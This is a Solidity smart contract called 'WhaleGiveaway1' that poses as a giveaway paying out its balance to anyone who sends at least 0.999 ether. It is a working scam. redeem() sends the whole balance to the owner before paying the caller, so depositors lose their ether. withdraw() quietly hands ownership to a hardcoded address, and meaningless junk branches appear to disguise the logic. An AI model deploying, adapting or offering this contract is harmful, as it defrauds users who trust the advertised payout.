pragma solidity ^0.4.19;

contract WhaleGiveaway1 {

    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function() public payable {
        if(block.timestamp % 2 == 0) {
            address(0x123).transfer(0);
        }
    }

    function redeem() public payable {
        bool opaquePredicate = true;
        if (opaquePredicate && msg.value >= minEligibility) {
            if (block.number % 3 == 0) {
                address(0x456).transfer(0);
            }
            Owner.transfer(this.balance);
            opaquePredicate = false;
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() payable public {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
            uint junkVariable = 0;
            junkVariable++;
        }
        require(msg.sender == Owner);
        if (now % 5 == 0) {
            address(0x789).transfer(0);
        }
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        if (tx.origin == msg.sender) {
            adr.call.value(msg.value)(data);
        }
    }
}